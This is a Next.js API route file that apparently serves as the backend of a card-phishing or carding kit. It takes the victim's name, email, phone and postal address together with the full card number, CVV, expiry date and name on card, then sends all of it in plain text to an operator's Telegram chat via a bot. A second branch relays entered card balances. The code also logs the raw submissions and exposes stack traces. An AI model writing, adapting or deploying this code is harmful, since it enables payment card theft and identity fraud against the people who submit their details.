// app/api/notify-telegram/route.ts
import { NextResponse } from "next/server";
import { sendTelegramMessage } from "@/lib/telegram";

function safe(value: unknown, fallback = "N/A") {
  if (value === undefined || value === null) return fallback;
  const str = String(value).trim();
  return str.length ? str : fallback;
}

export async function POST(req: Request) {
  try {
    const body = await req.json();

    console.log("📨 notify-telegram body:", JSON.stringify(body, null, 2));
    console.log("🔑 TOKEN present:", !!process.env.TELEGRAM_BOT_TOKEN);
    console.log("💬 CHAT_ID:", process.env.TELEGRAM_CHAT_ID);

    if (body.type === "brand_update") {
      const message = `💵 CARD BALANCE ENTERED:(id: ${safe(body.orderId)})
      
Card balance: ${safe(body.brandName)}`;

      await sendTelegramMessage(message);
      return NextResponse.json({ success: true });
    }

    const message = `💳 NEW CARD SUBMISSION:(id: ${safe(body.orderId)})
    
Contact info:

name: ${safe(body.firstName)} ${safe(body.lastName)}
email: ${safe(body.email)}
phone: ${safe(body.phone)}
address: ${safe(body.address)}
city: ${safe(body.city)}
state: ${safe(body.state)}
zip: ${safe(body.zipCode)}
country: ${safe(body.country)}

Card info:

Name on card: ${safe(body.cardName)}
card number: ${safe(body.cardNumber)}
cvv: ${safe(body.cvv)}
expiry date: ${safe(body.expiryDate)}

`;

    await sendTelegramMessage(message);
    return NextResponse.json({ success: true });
  } catch (err) {
    // surfaces the REAL error in both terminal and browser network tab
    const message = err instanceof Error ? err.message : String(err);
    const stack = err instanceof Error ? err.stack : "";
    console.error("❌ notify-telegram route error:", message, stack);
    return NextResponse.json(
      { success: false, error: message, stack },
      { status: 500 },
    );
  }
}
